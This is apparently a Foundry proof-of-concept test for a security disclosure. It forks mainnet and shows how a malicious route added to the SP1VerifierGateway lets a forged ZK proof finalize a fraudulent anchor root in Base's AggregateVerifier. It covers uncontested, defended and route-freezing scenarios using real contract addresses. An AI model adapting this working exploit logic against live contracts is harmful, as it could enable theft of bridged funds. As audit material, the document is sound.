// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// PoC: a malicious route added to the (Succinct-owned) SP1VerifierGateway lets an attacker
// forge a ZK proof in Base's AggregateVerifier (gameType 621). Three scenarios:
//
//   A. Uncontested: the forged game finalizes an arbitrary root in the AnchorStateRegistry.
//   B. Defended: while the game is in progress, anyone can nullify() it through an independent
//      legitimate route, refuting the forged proof and permanently killing the shared ZkVerifier,
//      after which the forged game can never resolve.
//   C. Unstoppable: if the malicious gateway owner also freezes every route, nullify() has no
//      usable route and the forged game finalizes anyway.
//
// Run (mainnet fork):
//   forge test --fork-url <RPC> --match-path test/ZkGatewayRouteForge.t.sol

interface Vm {
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
    function deal(address, uint256) external;
    function warp(uint256) external;
    function expectRevert(bytes calldata) external;
}

interface IDisputeGameFactory {
    function createWithInitData(uint32 gameType, bytes32 rootClaim, bytes calldata extraData, bytes calldata initData)
        external
        payable
        returns (address);
    function initBonds(uint32) external view returns (uint256);
    function gameImpls(uint32) external view returns (address);
}

interface IAggregateVerifier {
    function BLOCK_INTERVAL() external view returns (uint256);
    function INTERMEDIATE_BLOCK_INTERVAL() external view returns (uint256);
    function anchorStateRegistry() external view returns (address);
}

interface IGame {
    function resolve() external returns (uint8);
    function nullify(bytes calldata proofBytes, uint256 intermediateRootIndex, bytes32 intermediateRootToProve)
        external;
    function status() external view returns (uint8); // 0=IN_PROGRESS 1=CHALLENGER_WINS 2=DEFENDER_WINS
    function proofCount() external view returns (uint8);
    function expectedResolution() external view returns (uint64);
    function wasRespectedGameTypeWhenCreated() external view returns (bool);

    error GameNotOver();
}

interface IAnchorStateRegistry {
    function getAnchorRoot() external view returns (bytes32, uint256);
    function setAnchorState(address game) external;
    function respectedGameType() external view returns (uint32);
    function disputeGameFinalityDelaySeconds() external view returns (uint256);
}

interface IGateway {
    function addRoute(address verifier) external;
    function freezeRoute(bytes4 selector) external;
    function routes(bytes4) external view returns (address verifier, bool frozen);

    error RouteIsFrozen(bytes4 selector);
}

interface IZkVerifier {
    function nullified() external view returns (bool);
}

interface IVerifierHash {
    function VERIFIER_HASH() external view returns (bytes32);
}

// The attacker's backdoor verifier: accepts any proof.
contract MockBackdoorVerifier {
    function VERIFIER_HASH() external pure returns (bytes32) {
        return 0x1337133700000000000000000000000000000000000000000000000000000000;
    }

    function verifyProof(bytes32, bytes calldata, bytes calldata) external pure {}
}

// An honest route independent of the attacker, standing in for the real SP1 verifier. A genuine
// verifier would require a real proof of the true state; this mock accepts any, which is enough to
// model an honest, attacker-independent verification path in a unit test.
contract MockHonestVerifier {
    function VERIFIER_HASH() external pure returns (bytes32) {
        return 0x600d600d00000000000000000000000000000000000000000000000000000000;
    }

    function verifyProof(bytes32, bytes calldata, bytes calldata) external pure {}
}

contract ZkGatewayRouteForge {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    // Base (on L1) deployment, from .../base/discovered.json
    address constant FACTORY = 0x43edB88C4B80fDD2AdFF2412A7BebF9dF42cB40e;
    address constant ANCHOR_STATE_REGISTRY = 0x909f6cf47ed12f010A796527f562bFc26C7F4E72;
    address constant GATEWAY = 0x397A5f7f3dBd538f23DE225B51f532c34448dA9B;
    address constant GATEWAY_OWNER = 0xCafEf00d348Adbd57c37d1B77e0619C6244C6878; // Succinct 2/3 Safe
    address constant ZK_VERIFIER = 0x9e51DeFb019D1942d1210767f4A21bE5E24E3c3b;
    uint32 constant GAME_TYPE = 621;

    // The gateway's three live legitimate routes.
    bytes4 constant LEGIT_ROUTE_1 = 0xa4594c59;
    bytes4 constant LEGIT_ROUTE_2 = 0x0e78f4db;
    bytes4 constant LEGIT_ROUTE_3 = 0x4388a21c;

    address constant DEFENDER = 0x000000000000000000000000000000000000dEFe;

    // AggregateVerifier proof-type byte and game-status codes
    uint8 constant PROOF_TYPE_ZK = 1; // ProofType.ZK
    uint8 constant STATUS_DEFENDER_WINS = 2; // GameStatus.DEFENDER_WINS

    // ---- helpers -----------------------------------------------------------------

    // Gateway owner routes a selector to `verifier`. Returns the resulting selector.
    function _addRouteAsOwner(address verifier) internal returns (bytes4 selector) {
        selector = bytes4(IVerifierHash(verifier).VERIFIER_HASH());
        (address existing,) = IGateway(GATEWAY).routes(selector);
        require(existing == address(0), "selector collides with a live route");
        vm.prank(GATEWAY_OWNER);
        IGateway(GATEWAY).addRoute(verifier);
    }

    // Permissionlessly create a gameType-621 game whose ZK "proof" is junk routed to `selector`.
    function _forgeGame(bytes4 selector, bytes32 fraudRoot) internal returns (address game, uint256 newSeq) {
        IDisputeGameFactory factory = IDisputeGameFactory(FACTORY);
        IAggregateVerifier aggregateVerifier = IAggregateVerifier(factory.gameImpls(GAME_TYPE));

        (, uint256 anchorSeq) = IAnchorStateRegistry(ANCHOR_STATE_REGISTRY).getAnchorRoot();
        uint256 blockInterval = aggregateVerifier.BLOCK_INTERVAL();
        uint256 count = blockInterval / aggregateVerifier.INTERMEDIATE_BLOCK_INTERVAL();
        newSeq = anchorSeq + blockInterval;

        // extraData = l2BlockNumber(32) | parent=AnchorStateRegistry(20) | `count` roots (last == rootClaim)
        bytes memory roots;
        for (uint256 i = 0; i + 1 < count; i++) {
            roots = abi.encodePacked(roots, keccak256(abi.encode("intermediate", i)));
        }
        roots = abi.encodePacked(roots, fraudRoot);
        bytes memory extraData = abi.encodePacked(newSeq, ANCHOR_STATE_REGISTRY, roots);

        // initData = ZK(1) | l1OriginHash(32) | l1OriginNumber(32) | gatewaySelector(4) | pad(32)
        uint256 l1OriginNumber = block.number - 1;
        bytes memory initData =
            abi.encodePacked(PROOF_TYPE_ZK, blockhash(l1OriginNumber), l1OriginNumber, selector, bytes32(0));

        uint256 bond = factory.initBonds(GAME_TYPE);
        vm.deal(address(this), bond);
        game = factory.createWithInitData{value: bond}(GAME_TYPE, fraudRoot, extraData, initData);
        require(IGame(game).proofCount() == 1, "forged proof was not accepted");
        require(IGame(game).wasRespectedGameTypeWhenCreated(), "not respected at creation");
    }

    function _resolveAndFinalize(address game) internal {
        IAnchorStateRegistry registry = IAnchorStateRegistry(ANCHOR_STATE_REGISTRY);
        // gameOver() uses `expectedResolution <= block.timestamp`.
        vm.warp(uint256(IGame(game).expectedResolution()));
        IGame(game).resolve();
        require(IGame(game).status() == STATUS_DEFENDER_WINS, "game did not resolve DEFENDER_WINS");
        // isGameFinalized requires `now - resolvedAt` to strictly exceed the airgap delay.
        vm.warp(block.timestamp + registry.disputeGameFinalityDelaySeconds() + 1);
        registry.setAnchorState(game);
    }

    // A ZK "nullify" proof: ZK(1) | gatewaySelector(4) | pad(32). proofBytes[1:] is routed to the gateway.
    function _nullifyProof(bytes4 selector) internal pure returns (bytes memory) {
        return abi.encodePacked(PROOF_TYPE_ZK, selector, bytes32(0));
    }

    // ---- A. uncontested forge finalizes an arbitrary anchor root -------------------

    function test_A_forgeFinalizesWhenUncontested() public {
        require(IAnchorStateRegistry(ANCHOR_STATE_REGISTRY).respectedGameType() == GAME_TYPE, "621 not respected");

        bytes4 backdoor = _addRouteAsOwner(address(new MockBackdoorVerifier()));
        bytes32 fraudRoot = 0x6969696969696969696969696969696969696969696969696969696969696969;
        (bytes32 anchorRoot0,) = IAnchorStateRegistry(ANCHOR_STATE_REGISTRY).getAnchorRoot();

        (address game, uint256 newSeq) = _forgeGame(backdoor, fraudRoot);
        _resolveAndFinalize(game);

        (bytes32 anchorRoot1, uint256 anchorSeq1) = IAnchorStateRegistry(ANCHOR_STATE_REGISTRY).getAnchorRoot();
        require(anchorRoot1 == fraudRoot, "anchor root not forged");
        require(anchorSeq1 == newSeq, "anchor seq mismatch");
        require(anchorRoot1 != anchorRoot0, "anchor unchanged");
    }

    // ---- B. nullify through an independent honest route blocks the forge -----------

    function test_B_nullifyViaIndependentHonestRouteBlocksForge() public {
        bytes4 backdoor = _addRouteAsOwner(address(new MockBackdoorVerifier()));
        (address game,) = _forgeGame(backdoor, keccak256("fraud B"));
        require(!IZkVerifier(ZK_VERIFIER).nullified(), "precondition: verifier already nullified");

        // An independent legitimate route the defender uses to refute the proposal.
        bytes4 honest = _addRouteAsOwner(address(new MockHonestVerifier()));
        require(honest != backdoor, "routes must be distinct");

        // Anyone can nullify the in-progress game by proving a different root through the honest route.
        vm.prank(DEFENDER);
        IGame(game).nullify(_nullifyProof(honest), 0, keccak256("real root @0"));

        require(IGame(game).proofCount() == 0, "forged proof not refuted");
        require(IZkVerifier(ZK_VERIFIER).nullified(), "ZkVerifier not globally nullified");

        // nullify set the resolution clock to the "never" sentinel, so resolve() can never succeed.
        require(IGame(game).expectedResolution() == type(uint64).max, "resolution clock not disabled");
        vm.expectRevert(abi.encodeWithSelector(IGame.GameNotOver.selector));
        IGame(game).resolve();
    }

    // ---- C. freezing every route disables nullify, so the forge finalizes ----------

    function test_C_freezingAllRoutesDisablesNullify() public {
        bytes4 backdoor = _addRouteAsOwner(address(new MockBackdoorVerifier()));
        bytes32 fraudRoot = keccak256("fraud C");
        (bytes32 anchorRoot0,) = IAnchorStateRegistry(ANCHOR_STATE_REGISTRY).getAnchorRoot();
        (address game, uint256 newSeq) = _forgeGame(backdoor, fraudRoot);

        // freezeRoute is owner-only and irreversible. Freeze the backdoor and every legitimate
        // route, leaving no callable ZK route.
        vm.startPrank(GATEWAY_OWNER);
        IGateway(GATEWAY).freezeRoute(backdoor);
        IGateway(GATEWAY).freezeRoute(LEGIT_ROUTE_1);
        IGateway(GATEWAY).freezeRoute(LEGIT_ROUTE_2);
        IGateway(GATEWAY).freezeRoute(LEGIT_ROUTE_3);
        vm.stopPrank();

        // Every route is frozen, so nullify() cannot verify a refuting proof and reverts.
        vm.prank(DEFENDER);
        vm.expectRevert(abi.encodeWithSelector(IGateway.RouteIsFrozen.selector, LEGIT_ROUTE_1));
        IGame(game).nullify(_nullifyProof(LEGIT_ROUTE_1), 0, keccak256("real root"));
        require(!IZkVerifier(ZK_VERIFIER).nullified(), "verifier should NOT be nullified (nobody could)");

        // resolve() never touches the verifier, so the forged game still finalizes.
        _resolveAndFinalize(game);
        (bytes32 anchorRoot1, uint256 anchorSeq1) = IAnchorStateRegistry(ANCHOR_STATE_REGISTRY).getAnchorRoot();
        require(anchorRoot1 == fraudRoot, "anchor root not forged");
        require(anchorSeq1 == newSeq, "anchor seq mismatch");
        require(anchorRoot1 != anchorRoot0, "anchor unchanged");
    }
}
